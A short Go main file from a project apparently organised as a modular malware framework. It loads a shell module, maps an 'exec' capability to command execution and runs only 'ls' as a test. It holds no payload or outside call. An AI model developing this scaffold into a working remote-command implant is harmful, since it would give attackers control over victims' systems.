package main

import (
	"fmt"
	"malware/common"
	"malware/sh"
	"malware/types"
)

// List of modules
var modules []types.Module = []types.Module{sh.Create()}

var capabilities = map[string](func([]string) types.Event){"exec": sh.RunCommand}

/* Template file will probably contain something along the lines of
 * var modules = map[types.Module](chan types.Event){%loaded_modules%}
 */

func main() {
	for _, module := range modules {
		fmt.Println(module.ID(), "starting up...")
		channel := module.Init()

		//ttest channels
		fun, ok := capabilities["exec"]
		if !ok {
			common.Panicf(nil, "Fuck")
		}

		channel <- fun([]string{"ls"})
		<-channel // Wait before closing
		module.Shutdown()
	}

}
